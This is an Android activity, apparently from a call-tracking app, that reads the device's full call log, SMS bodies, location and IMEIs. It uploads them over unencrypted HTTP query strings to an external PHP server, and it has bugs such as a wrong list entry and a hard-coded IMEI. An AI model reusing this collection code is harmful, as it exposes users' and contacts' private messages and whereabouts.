package com.bizcall.wayto.mentebit13;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;



public class ReadLog extends AppCompatActivity implements GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener{
    public  static RequestQueue requestQueue;

    Intent intent;

    //SMS ////
   public static ArrayList<SMSDetails> mSMSArrayList;
   public static RecyclerView recyclerView;
    public static SMSDetails smsDetails;

    public static String urlCallDate;
    public static ArrayList<CallDetialswithIMEI> mCallArrayList;
    //public static ArrayList<SMSDetails> mSMSArrayList;
    public static CallDetialswithIMEI callDetails;
    public static SimpleDateFormat sdfSaveArray;
    public static Calendar calendar;
    // private RequestQueue requestQueue;
    public static TelephonyManager telephonyManager;
    //private LatLng latlang;
    //private GoogleMap mMap;


    public static int counturl = 0,countsmsurl=0;
    int day, month, year;
    public  static double currentLat, currentLong;
    int resultImeiexist=0;

   public static String callPhoneno, finalCallType, strdateFormated, callDuration, strImei1, strImei2, callphAccID,IMEINumber1,IMEINumber2;



    public static ArrayList<CallDetialswithIMEI>  mUploadCallArrayList;
    public static ArrayList<CallDetailsFetch> mUrlCallArrayList;
    public static ArrayList<SMSDetails> mUploadSMSArrayList;
    public static ArrayList<SMSDetailsFetch> mUrlSMSArrayList;
    public static CallDetialswithIMEI callDetialswithIMEI;
    public static CallDetailsFetch callDetailsFetch;
    public static SMSDetailsFetch smsDetailsFetch;
    public static SimpleDateFormat sdfComapre;
    public static GoogleApiClient mGoogleApiClient;
    public static Location mLocation;
    public static LocationManager locationManager;
    public static Context context;
    public static Cursor managedCursor,cursor;
    SharedPreferences sp;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ReadLog.context=getApplicationContext();
        sp=getSharedPreferences("Settings",Context.MODE_PRIVATE);
        IMEINumber1=sp.getString("IMEI1",null);
        IMEINumber2=sp.getString("IMEI2",null);
        managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        mGoogleApiClient = new GoogleApiClient.Builder(ReadLog.getAppContext())
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();

        locationManager = (LocationManager)this.getSystemService(Context.LOCATION_SERVICE);

        Uri uri = Uri.parse("content://sms");
        cursor = getContentResolver().query(uri, null, null, null, null);
        getCallDetails();
        getSMSDetails();
        getUserLocation();
    }
    public static Context getAppContext() {
        return ReadLog.context;
    }

    ////Calls--------------------------------------------

    @SuppressLint("NewApi")
    public static void getCallDetails() {

            getCallLogDetails();

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private static void getCallLogDetails() {
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int phAccID = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID);

        mCallArrayList = new ArrayList<>();
        mUrlCallArrayList = new ArrayList<>();
        mUploadCallArrayList = new ArrayList<>();
        sdfComapre = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");

        while (managedCursor.moveToNext()) {
            callPhoneno = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            callDuration = managedCursor.getString(duration);
            callphAccID = managedCursor.getString(phAccID);
            finalCallType = null;

            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    finalCallType = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    finalCallType = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    finalCallType = "MISSED";
                    break;
            }
            sdfSaveArray = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");
            strdateFormated = sdfSaveArray.format(callDayTime);

            callDetialswithIMEI = new CallDetialswithIMEI(callPhoneno, finalCallType, strdateFormated, callDuration, IMEINumber1, IMEINumber2, callphAccID);
            mCallArrayList.add(callDetialswithIMEI);
        }
        Log.d("callarraysize", mCallArrayList.size() + "");

        requestQueue = Volley.newRequestQueue(ReadLog.getAppContext());
        urlCallDate = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=405&IMEI=351891080405985";
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, urlCallDate, null,
                new callSuccess(), new callFail());

        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
                DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        requestQueue.add(jsonObjectRequest);
    }

    public static void uploadCalls(String callPhoneno, String finalCallType, final String strdateFormated,
                                   String callDuration, final String callIMEI1, String callIMEI2, String callphAccID) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(ReadLog.getAppContext());
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=401&MobileNo=" + callPhoneno +
                    "&CallType=" + finalCallType + "&CallDate=" + strdateFormated + "&CallDuration=" + callDuration +
                    "&IMEI1=" + callIMEI1 + "&IMEI2=" + callIMEI2 + "&PhoneAccountId=" + callphAccID;


            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    //Log.d("ChatResponse", response);
                    if (response.contains("Call inserted successfully")) {
                        //Toast.makeText(MainActivity.this, "Record inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(ReadLog.getAppContext(), "Record not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    counturl++;
                    Log.d("url count", counturl + " / " + "&CallDate=" + strdateFormated + " / " + response + " / " + callIMEI1);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {

                }
            });

            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }

private static class callSuccess implements Response.Listener<JSONObject> {
    @Override
    public void onResponse(JSONObject response) {
        Log.e("success", String.valueOf(response));
        try {
            JSONArray jsonArray = response.getJSONArray("data");
            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject jsonObject = jsonArray.getJSONObject(i);

                JSONObject lastdate = jsonObject.getJSONObject("dtCallDate");
                String mlastdate = lastdate.getString("date");

                Log.d("lastdate", mlastdate);
                callDetailsFetch = new CallDetailsFetch(mlastdate);
                mUrlCallArrayList.add(callDetailsFetch);
            }
            Log.d("urlarrlen", mUrlCallArrayList.size() + "");


            for (int i = 0; i < mCallArrayList.size(); i++) {
                String clno = mCallArrayList.get(i).getmCallMobileNo();
                String cltype = mCallArrayList.get(i).getmCallType();
                String cldate = mCallArrayList.get(i).getmCallDate();
                String clduration = mCallArrayList.get(i).getmCallDuration();
                String climei1 = mCallArrayList.get(i).getmIMEI1();
                String climei2 = mCallArrayList.get(i).getmIMEI2();
                String clphAccID = mCallArrayList.get(i).getmphAccID();

                if (mUrlCallArrayList.size() == 0) {
                    uploadCalls(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
                } else {
                    String strCompareRecord = mUrlCallArrayList.get(mUrlCallArrayList.size() - 1).getmfthCallDate();
                    Date dtMydate = sdfComapre.parse(strCompareRecord);
                    String strUrlDate = sdfComapre.format(dtMydate);

                    if (strUrlDate.compareTo(cldate) < 0) {
                        Log.d("datematch", strUrlDate + " / " + cldate);
                        callDetialswithIMEI = new CallDetialswithIMEI(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
                        mUploadCallArrayList.add(callDetails);
                    }
                }
            }
            Log.d("recordscall", "call upload without date");
            Log.d("uploadarraysizecall", mUploadCallArrayList.size() + "");
        } catch (ParseException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        for (int i = 0; i < mUploadCallArrayList.size(); i++) {
            String clno = mUploadCallArrayList.get(i).getmCallMobileNo();
            String cltype = mUploadCallArrayList.get(i).getmCallType();
            String cldate = mUploadCallArrayList.get(i).getmCallDate();
            String clduration = mUploadCallArrayList.get(i).getmCallDuration();
            String climei1 = mUploadCallArrayList.get(i).getmIMEI1();
            String climei2 = mUploadCallArrayList.get(i).getmIMEI2();
            String clphAccID = mUploadCallArrayList.get(i).getmphAccID();

            uploadCalls(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
        }
        Toast.makeText(ReadLog.getAppContext(), "Call Records Upload Successfully.", Toast.LENGTH_SHORT).show();
        Log.d("recordscall", "call upload with date");
    }
}

private static class callFail implements Response.ErrorListener {
    @Override
    public void onErrorResponse(VolleyError error) {
        Log.e("Fail", String.valueOf(error));
    }
}


    ///////////////////////////Location////////////////////////////////


    @TargetApi(Build.VERSION_CODES.M)
    public static void getUserLocation() {


        checkLocation(); //check whether location service is enable or not in your  phone
    }

    @Override
    public void onConnected(Bundle bundle) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        mLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);

        if (mLocation != null) {

            currentLat = mLocation.getLatitude();
            currentLong = mLocation.getLongitude();
            Log.d("latlong",currentLat+" / "+currentLong);

            uploadLocation(IMEINumber1, IMEINumber2, currentLat, currentLong);    //upload location method
            Log.d("location uploaded.",currentLat+" / "+currentLong);
            Toast.makeText(this, "Location Uploaded", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Location not Detected", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onConnectionSuspended(int i) {
        Log.i("conn suspend", "Connection Suspended");
        mGoogleApiClient.connect();
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {
        Log.i("conn fail", "Connection failed. Error: " + connectionResult.getErrorCode());
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (mGoogleApiClient != null) {
            mGoogleApiClient.connect();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (mGoogleApiClient.isConnected()) {
            mGoogleApiClient.disconnect();
        }
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    private static boolean checkLocation() {
        if(!isLocationEnabled()) {
            return isLocationEnabled();
        }
        return true;
    }

    private static boolean isLocationEnabled() {
            //locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public void uploadLocation(String callIMEI1, String callIMEI2, final double latitude, final double longitude) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(ReadLog.this);
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=403&IMEI1=" + callIMEI1
                    + "&IMEI2=" + callIMEI2 + "&latitude=" + latitude + "&longitude=" + longitude;

            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    if (response.contains("Data inserted successfully")) {
                        Toast.makeText(ReadLog.this, "Location inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(ReadLog.this, "Location not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    Log.d("url count", counturl + " / " + "&latitude=" + latitude + " / " + "&longitude=" + longitude + " / " + response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {
                }
            });
            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }

    //////////////////////////////////SMS/////////////////////////////////



    @SuppressLint("NewApi")
    public static void getSMSDetails() {


            getSMSLogDetails();

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private static void getSMSLogDetails() {


        mSMSArrayList = new ArrayList<>();
        mUrlSMSArrayList = new ArrayList<>();
        mUploadSMSArrayList = new ArrayList<>();
        sdfComapre = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");

        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                String smsbody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String phoneno = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                Date smsDayTime = new Date(Long.valueOf(date));
                String smstype = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                String typeOfSMS = null;
                switch (Integer.parseInt(smstype)) {
                    case 1:
                        typeOfSMS = "INBOX";
                        break;

                    case 2:
                        typeOfSMS = "SENT";
                        break;

                    case 3:
                        typeOfSMS = "DRAFT";
                        break;
                }
                sdfSaveArray = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String strdateFormated = sdfSaveArray.format(smsDayTime);

                smsDetails = new SMSDetails(phoneno, typeOfSMS, strdateFormated, smsbody, IMEINumber1, IMEINumber2);
                mSMSArrayList.add(smsDetails);
                cursor.moveToNext();
            }
        }
        Log.d("smsarraylist", String.valueOf(mSMSArrayList.size()));

        requestQueue = Volley.newRequestQueue(ReadLog.getAppContext());
        String urlSMSDate = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=406&IMEI=351891080405985";
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, urlSMSDate, null,
                new smsSuccess(), new smsFail());

        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
                DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        requestQueue.add(jsonObjectRequest);
    }

    public static void uploadSMS(String smsPhoneno, String finalsmsType, final String strdateFormated,
                                 String smsBody, String smsIMEI1, String smsIMEI2) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(ReadLog.getAppContext());
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=402&MobileNo=" + smsPhoneno +
                    "&SMSType=" + finalsmsType + "&SMSDate=" + strdateFormated + "&SMSBODY=" + smsBody +
                    "&IMEI1=" + smsIMEI1 + "&IMEI2=" + smsIMEI2;

            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    //Log.d("ChatResponse", response);
                    if (response.contains("SMS inserted successfully")) {
                        //Toast.makeText(MainActivity.this, "Record inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(ReadLog.getAppContext(), "Record not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    counturl++;
                    Log.d("url count", counturl + " / " + "&SMSDate=" + strdateFormated + " / " + response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {

                }
            });

            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }

private static class smsSuccess implements Response.Listener<JSONObject> {
    @Override
    public void onResponse(JSONObject response) {
        // Log.d("success", urlSMSDate);

        Log.e("success", String.valueOf(response));
        try {
            JSONArray jsonArray = response.getJSONArray("data");
            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject jsonObject = jsonArray.getJSONObject(i);

                JSONObject lastdate = jsonObject.getJSONObject("dtSMSDate");
                String mlastdate = lastdate.getString("date");

                Log.d("lastdate", mlastdate);
                smsDetailsFetch = new SMSDetailsFetch(mlastdate);
                mUrlSMSArrayList.add(smsDetailsFetch);
            }
            Log.d("urlarrlen", mUrlSMSArrayList.size() + "");

            Collections.reverse(mSMSArrayList);
            for (int i = 0; i < mSMSArrayList.size(); i++) {
                String smsno = mSMSArrayList.get(i).getmSMSMobileNo();
                String smstype = mSMSArrayList.get(i).getmSMStype();
                String smsdate = mSMSArrayList.get(i).getmSMSdate();
                String smsbody = mSMSArrayList.get(i).getmSMSbody();
                String smsimei1 = mSMSArrayList.get(i).getmSMSIMEI1();
                String smsimei2 = mSMSArrayList.get(i).getmSMSIMEI2();

                if (mUrlSMSArrayList.size() == 0) {
                    uploadSMS(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
                } else {
                    String strCompareRecord = mUrlSMSArrayList.get(mUrlSMSArrayList.size() - 1).getmfthSMSDate();
                    Date dtMydate = sdfComapre.parse(strCompareRecord);
                    String strUrlDate = sdfComapre.format(dtMydate);

                    if (strUrlDate.compareTo(smsdate) < 0) {
                        Log.d("datematch", strUrlDate + " / " + smsdate);
                        smsDetails = new SMSDetails(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
                        mUploadSMSArrayList.add(smsDetails);
                    }
                }
            }
            Log.d("recordsms", "sms upload with date");
            Log.d("uploadarraysizesms", mUploadSMSArrayList.size() + "");
        } catch (ParseException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        for (int i = 0; i < mUploadSMSArrayList.size(); i++) {
            String smsno = mUploadSMSArrayList.get(i).getmSMSMobileNo();
            String smstype = mUploadSMSArrayList.get(i).getmSMStype();
            String smsdate = mUploadSMSArrayList.get(i).getmSMSdate();
            String smsbody = mUploadSMSArrayList.get(i).getmSMSbody();
            String smsimei1 = mUploadSMSArrayList.get(i).getmSMSIMEI1();
            String smsimei2 = mUploadSMSArrayList.get(i).getmSMSIMEI2();

            uploadSMS(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
        }
        Toast.makeText(ReadLog.getAppContext(), "SMS Records Upload Successfully.", Toast.LENGTH_SHORT).show();
        Log.d("recordsms", "sms upload");
    }
}

private static class smsFail implements Response.ErrorListener {
    @Override
    public void onErrorResponse(VolleyError error) {
        Log.e("Fail", String.valueOf(error));
    }
}
}
